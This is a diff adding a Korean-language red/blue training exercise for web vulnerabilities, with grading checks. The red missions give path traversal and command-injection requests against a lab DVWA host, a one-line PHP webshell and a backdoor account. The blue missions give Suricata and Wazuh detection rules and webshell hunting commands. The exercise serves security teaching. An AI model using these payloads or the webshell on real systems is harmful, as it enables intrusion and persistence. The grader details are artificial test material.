@@ -1,0 +1,173 @@
+id: "web-vuln-w07"
+category: "web-vuln"
+title: "[웹취약점 W7] 파일 업로드/경로순회/명령주입 — RCE 발판 vs 입력검증 방어"
+difficulty: "medium"
+time_limit: 2700
+battle_type: "1v1"
+description: |
+  웹취약점 점검 7주차 — **파일 업로드 / 경로 순회 / 명령어 주입**. 셋 다 RCE 로 이어지는 고위험 취약점이다.
+  공격자는 웹쉘 업로드·트래버설·명령주입으로 발판을 얻고, 점검자(너)는 입력 검증·탐지로 방어한다.
+
+  ▸ 이야기: 공격자가 웹쉘을 업로드하고(태그 `wv07r1`) 웹쉘(`/var/www/html/.wv07shell.php`)과 계정 `wva07` 을 남긴다.
+    점검자는 ① 업로드/트래버설 탐지, ② 웹쉘 Wazuh 룰, ③ 입력검증 점검·R/B/P 로 대응한다.
+
+  ▸ 모드: solo/duel. 공격자=attacker-ext(2203), Red 채점=대상 흔적(WAF audit 태그/웹쉘·계정).
+  ▸ 마커: 태그 **`wv07r1-<본인id>`**, 웹쉘 **`/var/www/html/.wv07shell.php`**(마커 `wv07`), 계정 **`wva07`**,
+    Suricata **sid 9907011**, Wazuh **id 105071**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 22
+    instruction: |
+      ## 🎯 RED-1 [업로드/트래버설/명령주입] — RCE 시도
+
+      ### 할 일 (attacker-ext)
+      ```bash
+      curl -s -H "Host: dvwa.6v6.lab" "http://<대상_공개IP>/?file=wv07r1-kim/../../../../etc/passwd"
+      curl -s -H "Host: dvwa.6v6.lab" "http://<대상_공개IP>/vulnerabilities/exec/?ip=127.0.0.1;id%23wv07r1-kim&Submit=Submit"
+      ```
+      ### 채점 방법 / 합격 기준
+      대상 WAF audit 에 태그 `wv07r1` 흔적 시 인정.
+    hint: "태그(wv07r1) 트래버설/명령주입 → 대상 modsec audit. 채점: log_contains modsec wv07r1."
+    verify:
+      type: "log_contains"
+      expect: "wv07r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "wv07r1", since_sec: 1800 } }
+      semantic:
+        intent: "업로드/트래버설/명령주입(T1190/T1083/T1059) — RCE 경로. 태그(wv07r1) 귀속."
+        success_criteria: ["대상 WAF audit 에 wv07r1 태그", "어떤 벡터(업로드/트래버설/명령주입)인지 서술"]
+        acceptable_methods: ["attacker-ext 에서 태그 단 트래버설/명령주입"]
+        negative_signs: ["태그 누락 / 대상 미도달"]
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-2 [웹쉘 업로드] — PHP 웹쉘 + 계정
+
+      ### 할 일
+      ```bash
+      cat > /var/www/html/.wv07shell.php <<'PHP'
+      <?php /* wv07 */ system($_POST['c'] ?? ''); ?>
+      PHP
+      sudo useradd -m -s /bin/bash wva07
+      ```
+      ### 채점 방법 / 합격 기준
+      `/var/www/html/.wv07shell.php`(마커 `wv07`) 또는 `wva07` 존재 시 인정.
+    hint: "웹쉘 /var/www/html/.wv07shell.php (마커 wv07) + useradd wva07. 채점: file_contains shell wv07 + file_contains passwd wva07."
+    verify:
+      type: "file_contains"
+      expect: "wv07"
+      checks:
+        - { id: "red-2-1", type: "file_contains", target: "web",
+            params: { path: "/var/www/html/.wv07shell.php", pattern: "wv07" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "wva07" } }
+      semantic:
+        intent: "웹쉘 업로드(T1505.003) + 계정(T1136) — 업로드 검증 부재로 RCE 발판."
+        success_criteria: ["웹쉘(마커 wv07) 또는 계정 wva07", "업로드 검증 부재 서술"]
+        acceptable_methods: ["웹쉘 작성 + useradd"]
+        negative_signs: ["흔적 미생성"]
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-1 [트래버설/명령주입 탐지] — Suricata 룰 (sid 9907011)
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"WEBVULN-W07 path traversal / command injection"; flow:to_server; http.uri; content:"../"; nocase; sid:9907011; rev:1;)
+      ```
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+      ### 채점 방법 / 합격 기준
+      ips 의 `local.rules` 에 sid 9907011 룰 존재 시 인정.
+    hint: "트래버설/명령주입 Suricata 룰(sid 9907011) → reload. 채점: file_contains local.rules 9907011."
+    verify:
+      type: "file_contains"
+      expect: "9907011"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9907011" } }
+      semantic:
+        intent: "트래버설/명령주입 탐지 — Suricata 룰. RCE 경로 가시화."
+        success_criteria: ["local.rules 에 sid 9907011", "탐지 패턴 서술"]
+        acceptable_methods: ["Suricata 룰 작성 + reload"]
+        negative_signs: ["패턴 부정확 / 문법 오류"]
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-2 [웹쉘 탐지] — Wazuh 룰 (id 105071)
+
+      ### 할 일
+      ```xml
+      <group name="edu,webvuln,">
+        <rule id="105071" level="13">
+          <if_group>edu</if_group>
+          <match>wva07</match>
+          <description>WEBVULN-W07 - web shell upload / RCE account</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+      또한 웹쉘 헌팅: `find /var/www -name '.*.php' -mmin -120`
+      ### 채점 방법 / 합격 기준
+      `local_rules.xml` 에 id 105071 룰 존재 시 인정.
+    hint: "웹쉘 Wazuh 룰(id 105071) + find /var/www 헌팅 → restart. 채점: file_contains local_rules.xml 105071."
+    verify:
+      type: "file_contains"
+      expect: "105071"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "105071" } }
+      semantic:
+        intent: "웹쉘 탐지(호스트) — 업로드 웹쉘/계정 Wazuh 룰 + 헌팅."
+        success_criteria: ["local_rules.xml 에 rule id 105071", "웹쉘 탐지 + 헌팅 서술"]
+        acceptable_methods: ["Wazuh 룰 + 헌팅 + restart"]
+        negative_signs: ["탐지 로직 부실 / XML 오류"]
+
+  - order: 3
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-3 [입력검증 점검·R/B/P]
+
+      ### 할 일
+      보고서에:
+      - 업로드 검증(확장자/MIME/매직바이트/저장 위치 분리) + 트래버설 방어(정규화/화이트리스트) + 명령주입 방어(인자 분리) 점검
+      - R/B/P 회고 + 웹쉘(`/var/www/html/.wv07shell.php`)·계정(wva07) 헌팅·삭제
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+      ### 채점 방법 / 합격 기준
+      본인 SIEM 에 최근 경보 + 제출한 입력검증 점검·R/B/P 로 인정.
+    hint: "입력검증 점검(업로드 확장자/MIME/매직, 트래버설 정규화, 명령주입 인자분리) + R/B/P + 웹쉘/계정 헌팅·삭제. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "입력검증 점검 종합 — 업로드/트래버설/명령주입 방어 + R/B/P. 분석형 — 구체 방어 제시 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "업로드/트래버설/명령주입 방어 점검 + 위험도"
+          - "R/B/P 회고 + 웹쉘 삭제 + 계정 헌팅"
+        acceptable_methods: ["점검 표 + 방어 + 회고 + 헌팅"]
+        negative_signs: ["방어/회고 누락"]
